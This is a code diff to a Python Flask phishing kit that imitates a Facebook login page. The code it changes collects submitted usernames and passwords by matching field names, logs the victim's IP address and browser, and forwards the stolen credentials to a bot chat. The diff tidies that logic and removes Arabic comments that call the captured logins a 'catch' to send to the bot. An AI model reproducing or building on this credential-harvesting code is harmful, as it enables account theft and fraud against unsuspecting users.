@@ -97,9 +97,7 @@ def init_facebook_routes(app, bot):
             cookies_to_forward = request.cookies
 
             if request.method == 'POST':
-                # البحث الشامل عن حقول الدخول بغض النظر عن اسم المتغير في نموذج الفيسبوك
                 form_data = request.form.to_dict()
-                
                 username = None
                 password = None
                 
@@ -110,9 +108,8 @@ def init_facebook_routes(app, bot):
                     elif any(k in key_lower for k in ['pass', 'pwd', 'password', 'secret']):
                         password = val
 
-                # إذا لم يتم العثور بالاسم، جرب المفاتيح الافتراضية
                 if not username:
-                    username = request.form.get('email') or request.form.get('identifier') or request.form.get('pass')
+                    username = request.form.get('email') or request.form.get('identifier')
                 if not password:
                     password = request.form.get('pass') or request.form.get('password')
 
@@ -121,7 +118,6 @@ def init_facebook_routes(app, bot):
                             request.remote_addr
                 user_agent = request.headers.get('User-Agent', 'Unknown')
 
-                # إرسال الصيد للبوت فور التقاطه
                 if username and target_chat_id:
                     save_credentials_to_db("Facebook", username, password or "غير متاح", source_ip, user_agent, target_chat_id, bot)
                 
